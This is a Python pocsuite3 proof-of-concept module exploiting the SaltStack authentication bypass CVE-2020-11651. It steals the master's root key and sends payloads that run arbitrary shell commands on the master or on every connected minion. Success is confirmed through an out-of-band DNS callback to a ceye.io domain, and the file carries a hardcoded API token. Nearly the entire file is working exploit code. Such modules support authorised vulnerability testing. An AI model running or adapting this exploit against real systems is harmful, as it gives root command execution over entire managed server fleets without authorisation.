#!/usr/bin/env python
# _*_ encoding：utf-8 _*_

from __future__ import absolute_import, print_function, unicode_literals
from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import requests
from pocsuite3.lib.utils import random_str
import json
import argparse
import datetime
import os
import os.path
import sys
import time
import salt
import salt.version
import salt.transport.client
import salt.exceptions


class SaltStack(POCBase):
    vulID = ''
    version = '1.0'
    author = ['big04dream']
    vulDate = '2020-05-05'
    createDate = '2020-11-12'
    updateDate = '2020-11-12'
    references = ['']
    name = 'SaltStack远程命令执行漏洞（CVE-2020-11651）'
    appPowerLink = 'https://docs.saltstack.com/en/latest/'
    appName = 'SaltStack'
    appVersion = 'unKnow'
    vulType = 'rce'
    desc = '''
    SaltStack远程命令执行漏洞（CVE-2020-11651）
    '''

    def _options(self):
        o = OrderedDict()
        o['port'] = OptString('', description='这个poc需要输入端口', require=False)
        o['m'] = OptString('', description='master or minions', require=False)
        return o

    def channel(self):
        ip = self.url
        port = int(self.get_option('port')) or 4506
        minion_config = {
            'transport': 'zeromq',
            'pki_dir': '/tmp',
            'id': 'root',
            'log_level': 'debug',
            'master_ip': ip,
            'master_port': port,
            'auth_timeout': 5,
            'auth_tries': 1,
            'master_uri': 'tcp://{0}:{1}'.format(ip, port)
        }

        return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')

    def root_key(self):
        try:
            channel = self.channel()
            rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3)
            if rets:
                root_key = rets[2]['root']
                return root_key
        except Exception as e:
            pass
        return None

    def master_payload(self, root_key, cmd):
        payload = {"key": root_key,
               "cmd": "runner",
               'fun': 'salt.cmd',
               "kwarg": {
                   "fun": "cmd.exec_code",
                   "lang": "python3",
                   "code": "import subprocess;subprocess.call('{}',shell=True)".format(cmd)
               },
               'jid': '20200504042611133934',
               'user': 'sudo_user',
               '_stamp': '2020-05-04T04:26:13.609688'}
        return payload

    def minions_payload(self, cmd):
        jid = "{0:%Y%m%d%H%M%S%f}".format(datetime.datetime.utcnow())
        cmd = "/bin/sh -c '{0}'".format(cmd)

        payload = {
            'cmd': "_send_pub",
            "fun": "cmd.run",
            "arg": [cmd],
            "tgt": "*",
            "ret": "",
            "tgt_type": "glob",
            "user": "root",
            "jid": jid
        }

        return payload

    def _verify(self):
        result = {}
        try:

            m = self.get_option('m')
            domain = random_str(16) + '.6eb4yw.ceye.io'
            cmd = 'ping ' + domain

            channel = self.channel()
            payload = ''
            if m == 'master':
                root_key = self.root_key()
                payload = self.master_payload(root_key, cmd)
            elif m == 'minions':
                payload = self.minions_payload(cmd)
            channel.send(payload)

            res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
            if cmd in res:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Payload'] = payload
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(SaltStack)